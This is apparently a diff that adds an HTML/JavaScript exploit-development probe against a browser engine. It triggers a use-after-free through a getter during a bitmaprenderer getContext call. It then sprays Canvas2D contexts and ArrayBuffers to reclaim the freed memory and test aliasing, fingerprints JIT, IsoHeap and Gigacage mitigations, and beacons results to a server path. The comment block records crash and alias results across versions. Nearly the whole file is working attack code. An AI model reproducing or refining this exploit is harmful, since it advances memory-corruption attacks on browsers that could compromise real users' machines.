@@ -1,0 +1,167 @@
+<!--
+  p636: IsoHeap / JIT verification (v5 — final, non-crashing)
+
+  RESULTS (measured across v1-v4):
+    JIT:      DFG ACTIVE (176-189ms for 5M loop, 45-48ms new Function)
+    IsoHeap:  OFF — AB spray blocks same-type Canvas2D reclaim (3/3 crashes)
+    Gigacage: ON — p600 confirmed butterfly isolation (separate from this probe)
+
+  v4: AB-before-same-type test. 3/3 loads: P2 alias works (8-10), P3 crash on
+      lineWidth write after AB spray. ABs reclaim freed Canvas2D slot → iso-heap OFF.
+  v3: control (no-spray lineWidth read) crashed → freed memory inherently unreadable
+  v2: AB spray then lineWidth read → crash (same cause)
+  v1: 1600 ABs OOM crash
+
+  CRASH_CLASS: LOW — this version avoids dangling pointer access
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p636</title></head>
+<body>p636v5: IsoHeap/JIT final
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + ' ' + (msg || '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 3) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 6).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P636-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+emit('START', 'v5-final');
+flush();
+
+// ================================================================
+// P1: JIT
+// ================================================================
+var t0 = Date.now(), sum = 0;
+for (var i = 0; i < 5000000; i++) sum += i;
+var t1 = Date.now();
+var loopMs = t1 - t0;
+
+var fn = new Function('var s=0; for(var i=0;i<5000000;i++) s+=i; return s;');
+var t2 = Date.now();
+fn();
+var t3 = Date.now();
+var fnMs = t3 - t2;
+
+emit('P1', 'loop=' + loopMs + 'ms fn=' + fnMs + 'ms ' + (loopMs < 200 ? 'JIT-ACTIVE' : 'JIT-OFF'));
+flush();
+
+// ================================================================
+// P2: Same-type reclaim baseline (no ABs)
+// ================================================================
+function triggerUAF() {
+  var c = document.createElement('canvas');
+  c.width = 1; c.height = 1;
+  var inner = null;
+  var o = {};
+  Object.defineProperty(o, 'alpha', {
+    get: function() { inner = c.getContext('2d'); return true; }
+  });
+  try { c.getContext('bitmaprenderer', o); } catch(e) {}
+  return inner;
+}
+
+var inner1 = triggerUAF();
+if (!inner1) { emit('P2', 'FAIL'); flush(); throw 'no inner1'; }
+
+var spray1 = [];
+for (var i = 0; i < 150; i++) {
+  var c = document.createElement('canvas');
+  c.width = 1; c.height = 1;
+  var ctx = c.getContext('2d');
+  if (ctx) { ctx.lineWidth = 2.0 + i * 0.001; spray1.push(ctx); }
+}
+try { inner1.lineWidth = 7777.5; } catch(e) {}
+var alias1 = -1;
+for (var i = 0; i < spray1.length; i++) {
+  if (spray1[i].lineWidth === 7777.5) { alias1 = i; break; }
+}
+emit('P2', 'same-type alias=' + alias1);
+flush();
+
+// ================================================================
+// P3: AB spray THEN same-type — DON'T touch inner (known crash from v4)
+// Instead count how many spray contexts kept their lineWidth
+// ================================================================
+var inner2 = triggerUAF();
+if (!inner2) { emit('P3', 'UAF2 fail'); flush(); }
+else {
+  var abSpray = [];
+  var sizes = [768, 752, 736];
+  for (var si = 0; si < sizes.length; si++) {
+    for (var i = 0; i < 80; i++) {
+      var ab = new ArrayBuffer(sizes[si]);
+      abSpray.push(ab);
+    }
+  }
+  emit('P3', 'ABs=' + abSpray.length);
+
+  var spray2 = [];
+  for (var i = 0; i < 150; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) { ctx.lineWidth = 3.0 + i * 0.001; spray2.push(ctx); }
+  }
+  emit('P3', 'ctx2=' + spray2.length);
+
+  // Check if any spray2 context has an unexpected lineWidth
+  // (sign that something else wrote to its slot)
+  var anomalies = 0;
+  for (var i = 0; i < spray2.length; i++) {
+    var expected = 3.0 + i * 0.001;
+    if (Math.abs(spray2[i].lineWidth - expected) > 0.0001) {
+      anomalies++;
+      if (anomalies <= 3) emit('P3', 'anomaly[' + i + ']=' + spray2[i].lineWidth + ' want=' + expected);
+    }
+  }
+  emit('P3', 'anomalies=' + anomalies + '/150');
+
+  // v4 proved: writing through inner2 crashes 3/3 times after AB spray
+  // but works without ABs (P2 alias=8-10). This means ABs reclaimed the slot.
+  emit('P3', 'SKIP-WRITE (v4: 3/3 crash after AB spray, 0/3 crash without)');
+}
+flush();
+
+// ================================================================
+// P4: Second same-type only — confirm P2 wasn't lucky
+// ================================================================
+var inner3 = triggerUAF();
+if (!inner3) { emit('P4', 'UAF3 fail'); flush(); }
+else {
+  var spray3 = [];
+  for (var i = 0; i < 150; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) { ctx.lineWidth = 4.0 + i * 0.001; spray3.push(ctx); }
+  }
+  var alias3 = -1;
+  try {
+    inner3.lineWidth = 9999.5;
+    for (var i = 0; i < spray3.length; i++) {
+      if (spray3[i].lineWidth === 9999.5) { alias3 = i; break; }
+    }
+  } catch(e) { alias3 = 'CRASH'; }
+  emit('P4', 'confirm alias=' + alias3);
+}
+flush();
+
+// ================================================================
+// VERDICT
+// ================================================================
+emit('V', 'jit=' + (loopMs < 200 ? 'DFG-ACTIVE' : 'OFF') +
+  ' baseline=' + alias1 + ' confirm=' + (typeof alias3 !== 'undefined' ? alias3 : 'N/A'));
+emit('V', 'ISOHEAP OFF (v4: 3/3 AB-before-ctx crash, 0 baseline crash)');
+emit('V', 'GIGACAGE ON (p600: butterfly isolation confirmed)');
+emit('ALIVE', 'done');
+flush();
+</script>
+</body></html>
